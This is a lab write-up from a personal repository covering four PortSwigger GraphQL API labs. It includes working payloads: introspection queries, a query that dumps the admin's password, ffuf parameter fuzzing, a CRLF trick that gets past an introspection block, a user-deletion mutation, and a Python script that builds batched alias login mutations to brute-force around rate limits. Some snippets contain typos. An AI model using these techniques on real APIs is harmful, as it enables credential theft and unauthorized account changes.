# GraphQL API

## Summary
- Lab 01: Accessing private GraphQL posts
- Lab 02: Accidental exposure of private GraphQL fields
- Lab 03: Finding a hidden GraphQL endpoint
- Lab 04: Bypassing GraphQL brute force protections
## Lab 01: Accessing private GraphQL posts
With starting the lab, if we try to access any blog post we will find a graphQL API endpoint `/graphql/v1` that sends a query to access the intended post we need.

![lab1.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/lab1.png)

After sending `introspection query` to the server, it received that and we detected all fields of the `Blog Post` query.
![lab1 query.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/lab1%20query.png)
 - One of these fields is a `postPassword`, by trying all the IDs of the `Blog Posts`, we will detect, that there is a hidden post that holds a secret password.
 ![secretflag.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/secretflag.png)
---
## Lab 02: Accidental exposure of private GraphQL fields
 - The same thing in the previous lab, we will detect `/graphql/v1` API endpoint that sends queries to get the posts of the blog.
- We will send again the `introspection query` to discover all the queries that API does.

> [!NOTE]
> If  we send any Query without the `getBlogSummaries` name, it will get an error query.
![error.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/error.png)

- For this reason, we will send the query with the `getBlogSummaries` name, because it is required.
![200ok.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/200ok.png)
- After that i detected, there is an query is called `getUser` have `id`,`username`, and `password` fields.
- So what about sending a query to retrieve the admin credentials?
```
query getBlogSummaries{
	getUser(id:1){
	username
	password
	}
}
```
![creds.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/creds.png)
- Congrats, we have got the credentials for the `administrator`.

---------

## Lab 03: Finding a hidden GraphQL endpoint

- We will do some recon to discover any API endpoints.
![hidden_api.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/hidden_api.png)

- We discovered one then when i have gone to access the `/api` path, there is an error message appeared that request to set the query :
![not present.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/not%20present.png)
 - It is an indicator that there is a `SQL or GraphQL query` that the endpoint sends here.
- But we need to know what is the parameter that is set here, so now we can do more recon and fuzzing the parameters.
```sh
$ ffuf -u https://0a4b002b0406d2b38acb5010001d00bc.web-security-academy.net/api?FUZZ=ayhaga -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt
```

![fuzzingquery.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/fuzzingquery.png)

- After detcting the `query` parameter, try sending anything in it, you will gain an error that is an indicator for that is a `GraphQL` query:
```
https://0a9b009703e6302c8480052f008e0003.web-security-academy.net/api?query=ayhaga
```

![ayhaga.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/ayhaga.png)

- I tried to send the `introspection query`, but i have got an error which the `GraphQL introspection is not allowed`.
![errorschema.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/errorschema.png)

- We can try another technique by using the `CRLF Injection` with `%0D%0A` after this part `query IntrospectionQuery {` of the payload.
- The paylod will look like that:
```
query IntrospectionQuery { %0D%0A ......the_rest_of_the_IntrospectionQuery.....
```

![CRLF.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/CRLF.png)

- After that to make the process easier, i saved the schema of the server in the file, and i imported the file into the `InQL` tool.
- The tool extracted all queries that we can do to the server.
![InQL Tool.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/InQL%20Tool.png)

```
mutation{
deleteOrganizationUser(input: {id:3}}){
     user{
	     id
	     username
	}
  }
}
```

- Set this payload in the `GraphQL` editor and send the request to delete the user that you need by its `id`.
![delete.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/delete.png)

--------
## Lab 04: Bypassing GraphQL brute force protections
- In this lab, during the `login` process, if anyone tried to brute force for the user credentials, the server will block him for `1 Minute`.
![block.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/block.png)
- The server is using a `/graphql/v1` endpoint to make its queries.
- I sent the endpoint to the `InQL` to detect the rest of the query types.

![mutation.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/mutation.png)

- it doesn't exist any other queries unless the `mutation` query for the `login`, which is that takes the `LoginInput` like that:
![loginfailed.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/loginfailed.png)

- We have an idea, why not try sending more mutation queries in the same request instead of sending each single mutation query in one request?
- We will use the `aliases` technique to send more than one mutation in the  same query but with difference names.
```
mutaion {
	SadQuery1:login(input:{username:"carlos", password:"123456" }){
		token
		success
	}
	
	SadQuery2:login(input:{username:"carlos", password:"123456" }){
		token
		success
	}
}
```

- Now, We need to try a password wordlist to test which mutation will be a success login.
- We will do that with small python script:
```python
with open("passwords","r") as file:
    for i in range(1,101):
        for password in file:
            password = password.strip()
            
            query = f"SadQuery{i}:" + ' login(input:{username:"carlos",' + f'password:"{password}"' + """}){  
            token
            success
        }"""       
            i+=1
            print(query)
```

- Now we can send our attack:
![sadqueries.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/sadqueries.png)

![success.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/success.png)

- We have found a success response from one of the mutation queries.
![passwordsuccess.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/GraphQL%20API%20Labs/images/passwordsuccess.png)
